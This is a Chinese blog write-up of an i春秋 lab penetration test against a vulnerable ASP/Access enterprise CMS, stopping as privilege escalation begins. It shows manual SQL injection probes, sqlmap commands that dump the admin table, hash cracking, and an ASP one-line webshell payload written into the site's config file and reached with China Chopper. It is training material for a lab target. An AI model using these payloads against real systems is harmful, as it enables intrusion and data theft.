---
title: 【i春秋】渗透测试入门 —— 我很简单，请不要欺负我
copyright: true
date: 2018-03-20 21:22:11
tags: [i春秋,Pentest,Exploit,Writeup,CMS,Crypto,Web,ASP,Database,SQLi,Trojan,Vulnerability,Privilege,CMD]
categories: [InfoSec,Pentest]
---

# 0x00 前言

本实验是一次非常深入彻底的模拟渗透，虽然只针对一台服务器，但却经历了从最初的获取网站管理员账号密码，到获得网站的 webshell，最后到通过提权获得服务器系统最高权限的完整渗透过程。

从实验手册上给出的工具提示也能看出，本次渗透会用到目录扫描工具、注入工具、getshell 工具、提权工具等，可谓干货满满。若各位能亲自动手尝试所有能用到的工具，把整个渗透流程实现一遍，所有知识点都想明白，对初学者而言绝对有丰富的收获与极大的提升。

先简单介绍一下靶机环境：主站为**魅力企业网站管理系统**，采用 **ASP** 后端脚本语言，以及 **Microsoft Office Access** 数据库，该 CMS 年久失修，遍地漏洞，连官网也消失殆尽，不过还是能从各大软件平台下载到源码；服务器系统为 **Windows Server 2003 Enterprise Edition**，如果没打好补丁，此系统也是千疮百孔。总结一下，即典型的 **Windows + IIS + ASP + Access** 网站服务器出装。

- 题目链接：[https://www.ichunqiu.com/battalion?t=2&r=54399](https://www.ichunqiu.com/battalion?t=2&r=54399)
- 解题链接：[https://www.ichunqiu.com/vm/114/1](https://www.ichunqiu.com/vm/114/1)

<!-- more -->

![guide](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/guide.png)

***特此声明：由于本实验题目中包含 2 道选择题，因此不再沿用先前以题目名称作为章节标题的做法，而按照渗透流程的重要步骤来命名。***

# 0x01 简单聊聊 WVS

首先来看看第 1 道选择题：「WVS是什么工具？」，感觉问的很突兀，因为在本次渗透中 WVS 不是必要工具，也没有带来实质性的帮助，如果是我打开方式不对，还请指出。

[**AWVS（Acunetix Web Vulnarability Scanner）**](https://www.acunetix.com/)，简称 WVS，是国外安全公司 Acunetix 的主打产品，一款自动化 Web 应用程序安全测试工具，用于快速扫描 Web 应用常见漏洞、爬取网站目录结构、提供多种实用工具等。虽然这是一款需要付费的商业软件，但在国内还是可以找到破解版的。

既然环境里提供了 WVS 工具，省去了我们下载安装的麻烦，那事不宜迟，先来体验一番。打开实验工具箱，在【目录扫描】文件夹中打开【AWVS】，即可看见我们的工具了：

![acunetix](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/acunetix.png)

本节只演示 WVS 网站扫描的主要功能，包括目录扫描与漏洞扫描，其他功能请读者查看教程自行操作。点击 **New Scan**，在 **Scan Type** 栏的 **Website URL** 中填入目标站点 `http://www.test.ichunqiu/`，一直默认点击 **Next** 到最后的 **Finish** 栏，把 **CASE insensitive crawling** 前的钩去掉（因为服务器系统是 Windows，所有不需要大小写敏感，而 Linux 系统则需要），点击 **Finish** 完成。

等待一段时间，扫描完毕后，在界面中看到目录扫描与漏洞扫描的结果：

![acunetix_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/acunetix_result.png)

不过可惜的是，后台登录页面都没被抓取出来，所以前面我才说没有提供实质性的帮助，此处权当 WVS 工具的使用练习。回到题目，有如下 4 个选项，从 WVS 的全称不难看出，把它作为 **漏洞扫描工具** 更为合适：

- [ ] 注入工具 
- [x] 漏洞扫描工具
- [ ] 目录扫描工具
- [ ] 暴力破解工具

# 0x02 SQL 注入获取管理员账号密码

聊完了 WVS，下面随着第 2 题「管理员的密码是什么？」正式进入渗透流程。首当其冲必然是魅力企业网站管理系统，不过网上有关该系统的漏洞报告很少，难以找到有效资料。此时不要着急，先回想一下前面几次渗透实验，获取管理员账号密码的方法不外乎**敏感信息泄露、SQL 报错注入返回敏感信息、自动化注入工具直接读取数据库**等，因此思路很明确：**寻找网页中存在的注入点**。

## SQL 注入点的类型

在寻找 SQL 注入点之前，先科普一下注入点的类型。根据注入点输入数据的类型，可分为数字型注入与字符型注入，下面分别讲解这两种 SQL 注入的特点与区别。

> 小贴士：SQL 语句的单行注释一般有 `--` 与 `#`，在验证 SQL 注入点时，要习惯性地在查询语句末尾加上注释符，并且注释符后最好加上一个空格，避免代码中后续 SQL 语句的干扰。

### 数字型 SQL 注入

当注入点的输入参数为数字时，则称之为数字型 SQL 注入，例如 `id`、`age`、`order`、`page` 等参数。下面以主站中输入参数为数字型的页面 `http://www.test.ichunqiu/shownews.asp?id=1` 为例进行讲解。注意，在本次渗透环境中的 Access 数据库，只支持 `#` 注释符，读者可自行验证。

要判断 `ID=1` 是否为数字型 SQL 注入点，一般通过以下三步：

**（1）`http://www.test.ichunqiu/shownews.asp?id=1'# `**

由于数字参数在后台 SQL 语句中不需要引号闭合，如果在数字后插入一个英文单引号 `'`，会导致 SQL 语句闭合错误，页面出现异常。

**（2）`http://www.test.ichunqiu/shownews.asp?id=1 AND 1=1# `**

SQL 语句中限制条件为 `WHERE id=1 AND 1=1# `，相当于 `WHERE id=1# `，此时页面应该显示正常，与原请求无任何差异。

**（3）`http://www.test.ichunqiu/shownews.asp?id=1 AND 1=2# `**

SQL 语句中限制条件为 `WHERE id=1 AND 1=2# `，相当于 `WHERE 1=2# `，即限定条件恒为假，此时页面应该显示异常，查询不出任何内容。

因此，经过以上三个步骤，即可判断 `http://www.test.ichunqiu/shownews.asp?id=1` 存在数字型 SQL 注入。

### 字符型 SQL 注入

当注入点的输入参数为字符串时，则称之为数字型 SQL 注入，例如 `username`、`password`、`title`、`class` 等参数。下面以主站中输入参数为字符型的页面 `http://www.test.ichunqiu/Aboutus.asp?Title=%B9%AB%CB%BE%BC%F2%BD%E9` 为例进行讲解。

字符型与数字型 SQL 注入最大区别在于：**数字型不需要引号闭合，而字符型需要**。可见，字符型 SQL 注入最关键的是如何闭合 SQL 语句，代码中的 SQL 语句一般采用单引号，但也别忘了双引号的可能。

要判断 `Title=%B9%AB%CB%BE%BC%F2%BD%E9` 是否为字符型 SQL 注入点，一般通过以下两步：

**（1）`http://www.test.ichunqiu/Aboutus.asp?Title=%B9%AB%CB%BE%BC%F2%BD%E9' AND 1=1# `**

此时页面应该显示正常，但在测试中却出现异常，无法显示。

**（2）`http://www.test.ichunqiu/Aboutus.asp?Title=%B9%AB%CB%BE%BC%F2%BD%E9' AND 1=2# `**

此时页面应该显示异常，而测试的异常结果也与（1）中情况类似。

因此，经过以上两个步骤，即可判断 `http://www.test.ichunqiu/Aboutus.asp?Title=%B9%AB%CB%BE%BC%F2%BD%E9` 不存在字符型 SQL 注入。

至于不存在字符型 SQL 注入的原因，我们可以深入地分析一下。当 `Title=%B9%AB%CB%BE%BC%F2%BD%E9' AND '1'='1` 或 `Title=%B9%AB%CB%BE%BC%F2%BD%E9' AND '1'='1# ` 时，页面是能够正常显示的，但 `Title=%B9%AB%CB%BE%BC%F2%BD%E9' AND '1'='1'# ` 却不行，所以注释符 `#` 此处被过滤了。

小结一下以上手工查找 SQL 注入点的过程：

- 是否能用注释符屏蔽后续 SQL 语句的干扰，是 SQL 注入点可用性的重要因素。
- 对于字符型 SQL 注入，还要注意引号的闭合。
- 上述网站中，数字型 SQL 注入没有过滤注释符 `#`，而字符型过滤了。

最后粗略地统计网站中可用的数字型 SQL 注入点：

- `http://www.test.ichunqiu/shownews.asp?id=1`
- `http://www.test.ichunqiu/ProductShow.asp?ID=9`
- `http://www.test.ichunqiu/DownloadShow.asp?ID=9`
- `http://www.test.ichunqiu/CompHonorBig.asp?id=11`
- `http://www.test.ichunqiu/CompVisualizeBig.asp?id=10`


## SQL 自动化注入

既然知道了注入点，下面正式开始通过注入来获取管理员账号密码。一般而言，使用 SQL 自动化注入工具是读取数据库信息最高效的方法，极少数特别的注入点需要临时定制 payload 进行手工注入，因此熟悉多种注入工具是一名合格渗透工程师的基本要求。

国内外的 SQL 自动化注入工具种类繁多，下面将以明小子（Domian）、穿山甲（Pangolin）、SQLMap 等工具为例进行演示。以上工具均在实验工具箱中的【注入工具】文件夹下。

> 小贴士：一般的 SQL 自动化注入工具都带有判断注入点的功能，如果无法确定某参数是否存在注入，使用多款工具可以帮助你有效判断。

### 明小子（Domian）

**明小子（Domian）**是国内的一款 Web 应用程序综合渗透工具，有可视化图形界面，简单易用，在国内安全圈极负盛名。

打开工具，依次点击 **SQL注入 -> 批量扫描注入点 -> 添加网址**，填入主站 URL `http://www.test/ichunqiu/`，保存后点击 **批量分析注入点**：

![domain_info](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/domain_info.png)

分析完毕后，右击其中一个注入点，点击 **检测注入**：

![domain_injectable](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/domain_injectable.png)

点击后会自动跳转至 **SQL注入猜解检测** 选项卡，不过这里不用检测出来的注入点，用我们手工发现的注入点，一来换换口味，二来获得点成就感，三来顺便验证手工发现的注入点是否可靠。下面将 **注入点** 改为 `http://www.test.ichunqiu/shownews.asp?id=1`，点击 **开始检测**，结果确实为一个可用注入点：

![domain_verification](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/domain_verification.png)

确认可注入后，点击 **猜解表名** 后得到 4 张表，接着选中 `admin` 表，点击 **猜解列名** 后得到 3 个列名，在所有列名前打上钩，点解 **猜解内容** 后即可得到管理员的账号为 `admin`，16 位的密码哈希值为 `469e80d32c0559f8`。至此，通过明小子工具成功地获取了管理员的账号密码。

![domain_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/domain_result.png)

### 穿山甲（Pangolin）

[**穿山甲（Pangolin）**](https://baike.baidu.com/item/Pangolin)是深圳宇造诺赛科技有限公司（Nosec）多年前开发的一款 SQL 注入测试工具，如今时过境迁，官方网址不再提供工具的相关信息，而成为了[北京白帽汇科技有限公司](http://www.baimaohui.net/)旗下的一款名为 [NOSEC](https://nosec.org/) 的大数据安全协作平台。尽管穿山甲工具已停止开发维护，但对付传统数据库依然绰绰有余。

打开工具，在 **URL** 处填入注入点 `http://www.test.ichunqiu/shownews.asp?id=1`（注意：该工具不提供注入点扫描，只判断输入参数是否能作为注入点），点击 **开始** 箭头后，得到以下结果，说明注入点有效：

![pangolin_info](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/pangolin_info.png)

切换到 **Datas** 选项卡，点击 **Tables** 后得到 4 张表，接着选中 `admin` 表（注意不是打钩），点击 **Columns** 后得到 4 个列名，此时才在 `admin` 前打钩，选中所有列，点击 **Datas** 后即可获得管理员账号密码。可见，穿山甲工具的使用流程与明小子非常类似。

![pangolin_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/pangolin_result.png)

### SQLMap

[**SQLMap**](http://sqlmap.org/) 是一款专注于自动化 SQL 注入检测的开源渗透工具，用 Python 脚本语言编写，能在装有 Python 2.6.x 与 Python 2.7.x 的系统上跨平台运行，支持对数十种常见数据库的检测，被誉为 SQL 注入领域的一大渗透神器。

由于 SQLMap 只支持命令行界面，其易用性不如前两者，但丝毫不影响其渗透威力，反而还拥有更高的检测效率与更广的检测范围。SQLMap 作为渗透工程师常用且必备的工具，应当重点掌握。下面将列出渗透过程中常用的命令及用法，建议同时参考[官方文档](https://github.com/sqlmapproject/sqlmap/wiki)。

（1）`python sqlmap.py -h`：查询帮助手册。
（2）`python sqlmap.py -u <URL>`：检测该 URL 是否存在注入（末尾记得写上查询参数）。
（3）`python sqlmap.py -u <URL> --dbs`：查询所有数据库名。
（4）`python sqlmap.py -u <URL> --current-db`：查询当前数据库名。
（5）`python sqlmap.py -u <URL> -D <database> --tables`：查询某数据库中的所有表名。
（6）`python sqlmap.py -u <URL> -D <database> -T <table> --columns`：查询某数据表中的所有列名。
（7）`python sqlmap.py -u <URL> -D <database> -T <table> -C <column> --dump`：查询某列中的所有数据。

以上是通过 GET 方式来检测注入点，并进行 SQL 注入读取数据库中数据的常规套路。**注意一个特例：由于 Microsoft Access 数据库结构特殊，注入时不必通过（3）或（4）来查询数据库名，直接从（5）开始查询表名即可，`-D` 选项也可省去。**

> 小贴士：为了避免在命令行界面输入中文进入【SQLMap】目录，因此使用前建议将【SQLMap】文件夹拷贝到 C 盘下。

确保了命令行路径在【SQLMap】目录下后，根据（2）输入命令 `python sqlmap.py -u http://www.test.ichunqiu/shownews.asp?id=1` ，若询问「已确认 `id` 参数可注入，还需检测其他参数？」填 `N`，结果显示此为**基于布尔的盲注（boolean-based blind）**，并且返回了一些服务器相关信息，如：服务器操作系统为 **Windows 2003 或 Windows XP**，Web 应用程序采用了 **APS.NET、Microsoft IIS 6.0、ASP** 等建站技术，后端数据库数理系统为 **Microsoft Access**。以上对服务器相关信息的收集有助于后续更高效精准的渗透。

![sqlmap_info](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/sqlmap_info.png)

知道了后端数据库是 Microsoft Access 后，可以跳过（3）或（4）直接进行（5），输入命令 `python sqlmap.py -u http://www.test.ichunqiu/shownews.asp?id=1 --tables`，若询问「需要检测常用表名是否存在？」填 `Y`，询问「需要的线程数量？」填最大值 `10`。检测将近一半时，按 `Ctrl + C` 手动终止扫描，得到了包含 `admin` 表在内的 6 张表。**注意：由于 SQLMap 扫描所用的字典范围更广，因此比起前两者能发现更多的数据表。**

> 小贴士：由于扫描花时较长，当看到 `admin` 表出现时，可按 `Ctrl + C` 手动停止扫描。

![sqlmap_tables](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/sqlmap_tables.png)

继续执行（6）中的命令，输入 `python sqlmap.py -u http://www.test.ichunqiu/shownews.asp?id=1 -T admin --columns`，若询问「需要检测常用列名是否存在？」填 `Y`，询问「需要的线程数量？」填最大值 `10`。本次扫描不手动终止，等待其全部扫描完毕，得到了 `username` 与 `password` 等 6 个字段。

![sqlmap_columns](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/sqlmap_columns.png)

最后执行（7）中的命令，输入 `python sqlmap.py -u http://www.test.ichunqiu/shownews.asp?id=1 -T admin -C username,password --dump`，等待其枚举完毕，若询问「需要临时保存结果的哈希值？」填 `N`，询问「需要用字典攻击来破解结果？」填 `n`，随即可看到管理员的账号密码等数据。

![sqlmap_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/sqlmap_result.png)

## SQL 手工注入

除了会使用 SQL 自动化注入工具，手工注入也应该是渗透工程师的基本技能之一。下面仍旧针对上述注入点，演示手工注入获取 Access 数据库内容的全过程。详细指导可参考：

> [asp+access sql手工注入步骤](http://blog.csdn.net/geecky/article/details/51297268)
> [access手工注入](https://www.cnblogs.com/0nth3way/articles/7123033.html)

### Step 1：猜解表名

在火狐浏览器打开存在注入点的页面，将 URL 改为 `http://www.test.ichunqiu/shownews.asp?id=1 AND EXISTS(SELECT * FROM <table>)`，其中 `<table>` 为待猜解的表名，如果表名存在，页面将显示正常，否则出现异常。**注意：如果管理员把库名、表名、列名更改得随机复杂，手工注入将变得非常困难。**

打开 HackBar 工具，我们对 `admin`、`user`、`news` 等常见表名进行猜解，发现均能正常显示：

![manual_tables](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/manual_tables.png)

### Step 2：猜解列数

已知 `admin` 表存在后，接着猜解当前未知表的列数，用于后续的[联合查询（UNION SELECT）](http://www.w3school.com.cn/sql/sql_union.asp)，因为**联合查询的必要条件是每个查询的列数需要严格相等**。

猜解列数最便捷的方法是利用 [**ORDER BY**](http://www.w3school.com.cn/sql/sql_orderby.asp) 语句的隐藏用法。一般来说，`ORDER BY <column>` 代表对 `<column>` 列进行升排序，而 **`ORDER BY <column_order>` 代表对第 `<column_order>` 列进行升排序**。容易看出，`<column_order>` 的最大取值即为查询数据的列数，因此，当发现 `ORDER BY n` 显示正常，并且 `ORDER BY n+1` 出现异常时，可判断当前查询数据的列数为 n。

**注意，只有在后端数据库的查询语句为 `SELECT * FROM admin` 时，当前查询数据的列数 n 才等于数据库 `admin` 的总列数。**详情可参考：[sql注入之order by猜列数问题](https://segmentfault.com/a/1190000002655427)。

经过反复尝试，可以确定查询数据的列数为 11：

![manual_num_true](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/manual_num_true.png)

![manual_num_false](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/manual_num_false.png)

### Step 3：找出显位点

下面要构造联合查询 `UNION SELECT 1,2,...,n FROM <table>` 找出显位点，其中列数为 n，表名为 `<table>`。

> 小贴士：查询结果中的某些数据会出现在当前页面，而这些数据对应的列称为**显位点**。

经过反复试验，得知该数据库是从查询结果的第 1 列数据开始升排序（若第 1 列相等，则比较第 2 列，以此类推），并且将第 1 行结果的部分数据在页面上展示。因此上述联合查询能有效执行，并发现了显位点为第 2、3、7、8、9 列：

![manual_points](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/manual_points.png)

若想完全避免前一次查询结果的影响，可将限制条件 `id=1` 改为 `id=1 AND 1=2`。

### Step 4：猜解列名

最后一步，就是用猜想的列名去替换显位点，如果猜想正确，则页面会显示数据内容，否则出现异常。我们对 `user`、`username`、`account`、`pwd`、`password`、`key`、`credit` 等常见列名进行猜解，终于在 `username`、`password` 两列中读取到管理员的账号密码：

![manual_result](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/manual_result.png)

## 敏感信息泄露

在本节末尾留个小彩蛋，细心的读者可能在上述注入点的页面底部发现了：

![leak](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/leak.png)

对的，你想的没错，管理员的 16 位密码哈希值，用 [MD5解密工具](http://www.dmd5.com/md5-decrypter.jsp) 解密后的明文结果正是 `admin888`：

![password](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/password.png)

# 0x03 获取后台登录地址

根据实验手册的提示，在实验工具箱的【目录扫描】->【御剑后台扫描工具】文件夹下打开工具，在 **域名** 处填上主站 URL `http://www.test.ichunqiu/`，点击 **开始扫描** 即可轻松获取后台登录地址 `/admin/login.asp`：

![yujian_scan](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/yujian_scan.png)

上节提到的明小子（Domain）注入工具也带有目录扫描功能，点击 **SQL注入 -> 管理入口扫描** 选项卡，在 **注入点** 处填上主站 URL，点击 **扫描后台地址** 同样能得到后台登录地址：

![domain_scan](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/domain_scan.png)

> 小贴士：通过这几次渗透实验可发现，大多 CMS 的默认后台登录地址为 `/admin`，因此在使用目录扫描工具前可先行尝试。

# 0x04 配置文件写入木马获取 webshell

第 2 题过后，随之而来的第 3 题又是一道选择题：「通过什么方式获得 webshell？」，这也同时是对接下来渗透的提示。

先用管理员账号 `admin` 与密码 `admin888` 登录后台：

![login_back](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/login_back.png)

根据题目的提示，寻找后台备份文件、文件上传处、内容填写框等能够插入木马的漏洞，但可惜的是，很快能发现**备份文件无效、文件上传无反应、大多文本框不能填写**，看来服务器限制了该账户的写入权限。

只剩下**写入配置文件**了，并在 **系统设置管理 -> 网站信息配置** 发现了配置文件更改处。问题又来了，写入木马的配置文件在哪读取？于是先在外网搜索到 CMS 的源码，在此目录中搜索 `conf` 等关键字，发现了 4 个目标文件：

![search_config](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/search_config.png)

经过逐一排查，最终确定其中的 `/inc/Config.asp` 与网站配置信息相关：

![inc_config](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/inc_config.png)

接下来尝试在任意一栏中写入 ASP 版的一句话木马 `"%><%Eval Request("cmd")%><%'`。**注意：`"%>` 是为了闭合前段 ASP 代码；`cmd` 是木马的请求参数；`<%'` 是为了开启后段 ASP 代码，并用单引号注释该行剩下的代码。**写入木马前，最好把栏中原有的配置信息删除，即可直观地判断是否写入成功。

以 **网站标题** 一栏为例，写入一句话木马：

![trojan_writing](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/trojan_writing.png)

写入后点击 **保存设置**，可见写入木马后该栏为空：

![trojan_written](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/trojan_written.png)

然后在工具箱【webshell】目录下拔出[中国菜刀](http://www.zhongguocaidao.com/)，在 **添加SHELL** 中填入目标 URL 与请求参数后保存：

![chopper_trojan](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/chopper_trojan.png)

双击 shell 记录，成功连接网站的文件管理系统：

![chopper_file_manager](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95_%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/chopper_file_manager.png)

最后回到题目，根据选项提示，成功验证了能够通过 **写入配置文件** 获得 webshell：

- [ ] 后台备份文件 
- [ ] 直接上传木马
- [ ] 代码执行
- [x] 写配置文件

# 0x05 上传工具，系统提权

终于到达最后一关：「获取目标服务器密码」，这需要破解操作系统上用户的密码哈希值，倒推一下思路：**获得服务器系统最高权限 -> 上传提权工具 -> 寻找上传点**，赶紧动手开始吧！

怎么确定上传点呢？具有写权限的目录都可以作为上传点，在 C 盘下的每个目录尝试上传，发现 `C:\Inetpub`、`C:\RECYCLER`、`C:\wmpub` 三个目录具有写权限，其他目录均写入失败。下面演示以 `C:\wmpub` 作为上传点。

